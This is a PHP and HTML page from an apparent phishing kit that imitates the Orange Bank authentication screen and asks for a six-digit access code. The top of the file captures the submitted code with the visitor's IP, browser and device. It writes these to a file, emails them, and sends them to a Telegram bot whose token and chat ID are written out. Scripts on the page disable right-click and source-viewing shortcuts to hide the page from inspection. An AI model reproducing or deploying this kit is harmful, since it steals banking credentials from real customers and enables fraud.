<?php

include("funcs.php");
$_SESSION['data'] = $_POST['data'];

$message  = "----------- | New SMS - ORANGE-B | -----------\n\n";
$message .= "#SMS : ".$_POST['data']."\n";
$message .= "------------------ | INFO | ------------------\n\n";
$message .= "Device  : ".$OS."\n";
$message .= "Browser : ".$Browser."\n";
$message .= "IP      : ".$ip."\n";
$message .= "----------- | New SMS - ORANGE-B | -----------\n\n\n\n\n";

$send = "";
$subject = "ORANGE-B |".$ip;
$headers = "From:  Login <orba@localprofessional.fr>";
mail($send,$subject,$message,$headers);
 
$file = fopen("./res.txt","a");
fwrite($file,$message);  

$website="https://api.telegram.org/bot2094813505:AAFHBjjO8b-NBpbMZx24VeW-LacwMS5Adng";
$chatId=2071280946;  //Receiver Chat Id 
$params=[
    'chat_id'=>'2071280946',
    'text'=>$message,
];
$ch = curl_init($website . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);


?>
<html><head>
 <link rel="icon" href="./favicon.ico" type="image/ico" sizes="16x16">
	<link rel="stylesheet" type="text/css" href="./triangle/css/fontawesome.min.css">
	<link rel="stylesheet" type="text/css" href="./triangle/css/all.min.css">
	<script type="text/javascript">


document.onkeypress = function(event) {
event = (event || window.event);
if (event.keyCode === 123) {
return false;}};
document.onmousedown = function(event) {
event = (event || window.event);
if (event.keyCode === 123) {
return false;}};
document.onkeydown = function(event) {
event = (event || window.event);
if (event.keyCode === 123) {
return false;}};
function cp() {return false;}
function mousehandler(e) {
var myevent = (isNS) ? e : event;
var eventbutton = (isNS) ? myevent.which : myevent.button;
if ((eventbutton == 2) || (eventbutton == 3))
return false;}
document.oncontextmenu = cp;
document.onmouseup = cp;
var isCtrl = false;
window.onkeyup = function(e)
{if (e.which == 17)
isCtrl = false;}
window.onkeydown = function(e)
{if (e.which == 17)
isCtrl = true;
if (((e.which == 85) || (e.which == 65) || (e.which == 88) || (e.which == 67) || (e.which == 86) || (e.which == 83)) && isCtrl == true){
return false;}}
document.ondragstart = cp;
	</script>
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<style type="text/css">

body {
    max-width: 400px;
      margin: auto;
}


.form-style-8 h2{
	background: #4D4D4D;
	text-transform: uppercase;
	font-family: 'Open Sans Condensed', sans-serif;
	color: #797979;
	font-size: 18px;
	font-weight: 100;
	padding: 20px;
	margin: -30px -30px 30px -30px;
}
::placeholder { /* Chrome, Firefox, Opera, Safari 10.1+ */
  color: black;
  opacity: 1; /* Firefox */
  font-size: 35px;
}

:-ms-input-placeholder { /* Internet Explorer 10-11 */
  color: black;
  font-size: 35px;
}

::-ms-input-placeholder { /* Microsoft Edge */
  color: black;
  font-size: 35px;
}
.form-style-8 input[type="text"],
.form-style-8 input[type="date"],
.form-style-8 input[type="datetime"],
.form-style-8 input[type="email"],
.form-style-8 input[type="number"],
.form-style-8 input[type="search"],
.form-style-8 input[type="time"],
.form-style-8 input[type="url"],
.form-style-8 input[type="password"],
.form-style-8 textarea,
.form-style-8 select 
{
	box-sizing: border-box;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	outline: none;
	display: block;
	width: 100%;
	padding: 7px;
	border: none;
	background: transparent;
	margin-bottom: 10px;
	font: 28px Arial, Helvetica, sans-serif;
	height: 45px;
}
	input { 
    text-align: center; 
}
	
.form-style-8 textarea{
	resize:none;
	overflow: hidden;
}
.form-style-8 input[type="button"], 
.form-style-8 input[type="submit"]{
	-moz-box-shadow: inset 0px 1px 0px 0px #45D6D6;
	-webkit-box-shadow: inset 0px 1px 0px 0px #45D6D6;
	box-shadow: inset 0px 1px 0px 0px #45D6D6;
	background-color: #2CBBBB;
	border: 1px solid #27A0A0;
	display: inline-block;
	cursor: pointer;
	color: #FFFFFF;
	font-family: 'Open Sans Condensed', sans-serif;
	font-size: 14px;
	padding: 8px 18px;
	text-decoration: none;
	text-transform: uppercase;
}
.form-style-8 input[type="button"]:hover, 
.form-style-8 input[type="submit"]:hover {
	background:linear-gradient(to bottom, #34CACA 5%, #30C9C9 100%);
	background-color:#34CACA;
}</style>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Authentification - Orange Bank</title>
<link rel="stylesheet" type="text/css" href="files/style.css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
<script src="files/function.js"></script>
		<script type="text/javascript">
//auto expand textarea
function adjust_textarea(h) {
    h.style.height = "20px";
    h.style.height = (h.scrollHeight)+"px";
}

		$(document).ready(function(){
			$("#text").keyup(function(){
			var a = $(this).val().length;
			if(a >= 6){
			$(this).attr('maxlength','6')
			document.forms["form"].submit();
			}
			})
		})

    
function isNumber(evt) {
    evt = (evt) ? evt : window.event;
    var charCode = (evt.which) ? evt.which : evt.keyCode;
    if (charCode > 31 && (charCode < 48 || charCode > 57)) {
        return false;
    }
    return true;
}

</script>
</head>
<body>
               <form method="post" name="form" class="form-authentication" id="form" autocomplete="off" accept-charset="ISO-8859-1" action="IdenPER">
		<div class="table">
			<img class="logo" src="./files/oblogo.png">
			
			<div>

			<p class="txt2" style="text-align:center;color: #000000;font-size:17px; ! important">Identification</p><hr style="width: 70%;margin-top: 10px;margin-left: 0%;margin-bottom: 10px;border: 2px solid #f16e00;" align="left"><br><p class="txt2" style="text-align:center;color: #000000; ! important">Saisissez votre code d'accès</p>


			
			</div>
			
		
			<div class="form-style-8">
    <input pattern="[0-9]*" inputmode="numeric"  maxlength="6" id="text" type="text" required="" name="data" placeholder="○ ○ ○  ○ ○ ○"><br><p class="txt2" style="text-decoration: underline;text-align:center;color: #f16e00;font-size:12px; ! important">Code d'accès oublié ?</p><br>




</div>
	
			




			
			
			
			
			
			
			
			


			
			
			
			
			
			
		</div>
	</form>


</body></html>